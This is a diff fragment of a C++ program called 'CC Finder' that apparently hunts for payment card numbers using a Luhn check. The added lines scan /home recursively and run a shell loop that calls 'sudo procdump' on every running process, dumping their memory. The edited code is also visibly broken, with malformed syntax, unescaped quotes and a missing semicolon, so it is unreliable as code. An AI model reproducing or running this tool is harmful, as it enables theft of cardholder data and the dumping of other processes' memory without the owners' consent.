@@ -35,20 +35,24 @@ bool checkLuhn(const string& cardNo)
 
 int main(int argc, char* argv[])
 {
+	std::string filename = "CCFinder.log";
+	std::string sdir = "/home";
 	cout << "CC Finder by independent 3.3 https://GitHub.com/independentcod All rights reserved" << std::endl;
 	cout << "Please wait a few hours this will take a while..." << std::endl;
 	cout << "---" << std::endl;
 	std::ofstream fout("CCFinder.log", ios::app);
 	fout << "CC Finder by independent 3.3 https://GitHub.com/independentcod All rights reserved" << std::endl;
 	std::ifstream ifile("/usr/bin/procdump");
-	if ((bool)ifile) {
-		system("for i in $(ps -axo pid); do sudo /usr/bin/procdump -p $i; done");
-			}
-	for (const auto& x : fs::recursive_directory_iterator(argv[1])) {
-		if (boost::filesystem::is_regular_file(x.path())) {
+	 (if(bool)ifile) {
 			boost::filesystem::absolute(x.path().filename());
 			fs::path entry = x;
 			std::string line;
+		system("if [ -f "/usr/bin/procdump" ]; then for i in $(ps -axo pid); do sudo /usr/bin/procdump -p $i; done; fi");
+			}
+			for (auto& x : fs::recursive_directory_iterator(sdir)) {
+			if(strstr(x.c_str(),filename.c_str()))
+				return 0
+			}
 			std::cout << entry << std::endl;
 			try
 			{
